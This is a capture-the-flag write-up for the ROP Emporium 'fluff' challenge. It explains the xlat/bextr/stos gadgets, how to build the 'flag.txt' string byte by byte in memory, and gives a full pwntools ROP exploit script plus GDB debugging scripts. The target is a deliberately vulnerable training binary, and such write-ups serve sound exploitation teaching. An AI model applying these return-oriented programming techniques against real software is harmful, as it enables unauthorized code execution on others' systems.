# Challenge Theory
This is a basic rop challenge, but there are only a few useful gadgets.
## Gadgets
The useful gadgets are:
```c
0x400628 xlat BYTE PTR ds:[rbx]; ret    
0x40062a pop rdx; pop rcx; add rcx, 0x3ef2; bextr  rbx,rcx,rdx; ret    
0x400639 stos BYTE PTR es:[rdi],al; ret   
```
# Solution Theory
Like most of the previous challenges, the attacker just needs to call the "print_file" function with an argument to the flag.
However, the attacker no longer has easy access to a simple write primitive, so they have to get the flag string from memory.
# Solution
## Getting the Flag String From Memory
There are two methods to get the "flag.txt" string from memory.
The first method is manually looking through the binary with a reverse engineering tool.
The second method is just doing automatically with pwntools.
### pwntools Snippet to get the Flag String
```python
'''
taken from video: https://www.youtube.com/watch?v=UM6d8DPB8wo&list=PLHUKi1UlEgOKAVRdiMlpX6hgayiY6dTwu&index=7
find and build the flag string from within the binary itself
'''
elf = pwn.ELF(binary, checksec=False)
flag_string = b"flag.txt"
char_mem_addrs = []
for x in flag_string:
    # this also adds the elf offset
    addr = hex(pwn.read(binary).find(x) + elf.address)
    char_mem_addrs.append(addr)
    pwn.info(f"found: \"{chr(x)}\" at address: {addr}")
```
## Encoding the Flag String into Memory 
Encoding the string into the data section of the binary requires all of the gadgets, and also requieres mixing in some other ones as well.
### Gadgets
The "bextr" string of gadgets will populate the required registers, and then it will extract rcx into rbx, using rdx as an argument for start, and length.
```c
mov rbx, rcx ; with length of [7:0] starting point and [15:8] length
```
The "xlat" gadget will do this:
```c
mov al, [rbx + al]
```
Finally, the stos gadget will do this
```c
mov [rdi], al
add rdi, 1
```
### Gadget Chain in Python
Stringing these together can create a write primitive
```python
# encode the flag into memory
flag_vals = b"flag.txt"
offset = 0
encode_flag = b""
current_rax = 0xb
for i in range(0, 8):
    if i != 0:
        current_rax = flag_vals[i-1]
    encode_flag += gadget_bextr
    encode_flag += pwn.p64(0x4000)
    encode_flag += pwn.p64(int(char_mem_addrs[i], 16) - current_rax - 0x3ef2)
    encode_flag += gadget_xlat
    encode_flag += gadget_pop_rdi
    encode_flag += pwn.p64(location_write_value + i) 
    encode_flag += gadget_store_byte  
```
The only thing of not here is the "current_rax" subtraction.
This exists because you have to offset the value current in the rax register, because the "xlat" gadget will use that as part of it calculation(as stated earlier).
After this encoding is done, all the attacker needs to do is call the "print_file" function.
## Final Rop Chain Script
```python
#!/usr/bin/python3
import pwn
import sys
binary = "fluff"
pwn.context.binary = binary
pwn.context.encoding = "latin"

location_write_value = 0x601028
location_write = pwn.p64(0x601028)
location_f = pwn.p64(0x000000cd)
gadget_store_byte = pwn.p64(0x400639)
gadget_pop_rdi = pwn.p64(0x4006a3)
gadget_ret = pwn.p64(0x400295)
gadget_xlat = pwn.p64(0x400628)
gadget_bextr = pwn.p64(0x40062a)
gadget_mov_eax_0_pop_rbp = pwn.p64(0x400610)
gadget_print_file = pwn.p64(0x400510)

'''
taken from video: https://www.youtube.com/watch?v=UM6d8DPB8wo&list=PLHUKi1UlEgOKAVRdiMlpX6hgayiY6dTwu&index=7
find and build the flag string from within the binary itself
'''
elf = pwn.ELF(binary, checksec=False)
flag_string = b"flag.txt"
char_mem_addrs = []
for x in flag_string:
    # this actually adds the elf offset which is usually 0x400000 (aslr can change this)
    addr = hex(pwn.read(binary).find(x) + elf.address)
    char_mem_addrs.append(addr)
    pwn.info(f"found: \"{chr(x)}\" at address: {addr}")

'''
this encoding flag part was partially taken from this blog:
    https://mregraoncyber.com/rop-emporium-writeup-fluff/?utm_source=rss&utm_medium=rss&utm_campaign=rop-emporium-writeup-fluff
'''
# encode the flag into memory
flag_vals = b"flag.txt"
offset = 0
encode_flag = b""
current_rax = 0xb
for i in range(0, 8):
    if i != 0:
        current_rax = flag_vals[i-1]
    encode_flag += gadget_bextr
    encode_flag += pwn.p64(0x4000)
    encode_flag += pwn.p64(int(char_mem_addrs[i], 16) - current_rax - 0x3ef2)
    encode_flag += gadget_xlat
    encode_flag += gadget_pop_rdi
    encode_flag += pwn.p64(location_write_value + i) 
    encode_flag += gadget_store_byte  

padding = 40
payload = pwn.flat(
    b"A"*padding,
    encode_flag,
    gadget_pop_rdi,
    location_write,
    gadget_print_file
)

if ("input" in sys.argv):
    with open("input", "wb") as io:
        io.write(payload)

if ("log" in sys.argv):
    pwn.context.log_level = "debug"

with pwn.process(binary) as io:
    pwn.info(io.readrepeat(1))
    io.send(payload)

    if ("interactive" in sys.argv):
        io.interactive()

    if ("output" in sys.argv):
        pwn.info(io.readrepeat(1))
```
# Other Info
To debug the encoding of the string into memory, a couple of gdb scripts were used.
The first gdb script was a simple set of breakpoints
## Breakpoint Script
```bash
b *0x4006a3
b *0x400610
b *0x400295
b *0x40062a
b *0x400628
b *0x400639
b *0x400510
r < input
```
This script is self explanatory, just step through the gadgets.
## Looped Script To Inspect the Changing of the Data Section
```bash
b *0x40063a
r < input
commands
    printf "current flag\n"
    x/s 0x601028
    continue
end
continue
```
This examines the area in memory the flag is placed with every iteration of it being encoded.
This is because the flag is encoded character by character, due to the limitation of the gadgets provided.